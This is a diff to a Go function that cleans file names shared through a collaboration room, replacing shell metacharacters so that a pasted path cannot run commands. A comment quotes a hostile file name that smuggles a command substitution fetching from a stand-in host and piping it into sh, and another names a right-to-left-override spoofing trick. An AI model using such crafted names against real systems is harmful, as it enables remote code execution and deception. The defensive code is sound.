@@ -377,6 +377,9 @@ func hostState(aw *awareness.Awareness) (map[string]any, bool) {
 // sharedFileName takes the file name the host shares, which comes from the
 // room: only a plain name is accepted, never a path, and nothing that changes
 // how the name prints. "invoice\u202ecod.md" would show as invoicedm.doc.
+// The path of the copy is put on the clipboard to paste into a shell, so the
+// characters that run or redirect commands there become "_":
+// "notes$(curl evil|sh).md" is saved as notes__curl evil_sh_.md.
 func sharedFileName(host map[string]any) (string, bool) {
 	name, _ := host["file"].(string)
 	if name == "" || name == "." || name == ".." || len(name) > 255 {
@@ -390,8 +393,17 @@ func sharedFileName(host map[string]any) (string, bool) {
 			return "", false
 		}
 	}
-	return name, true
+	return strings.Map(func(r rune) rune {
+		if strings.ContainsRune(shellSpecial, r) {
+			return '_'
+		}
+		return r
+	}, name), true
 }
+
+// shellSpecial are the characters with which a path pasted into sh, cmd or
+// PowerShell unquoted runs commands or redirects output.
+const shellSpecial = "$`;&|<>()"
 
 // parseShareURL returns the room's WebSocket URL, its ID and the key from a
 // share link. The key is in the fragment and never leaves this process. The
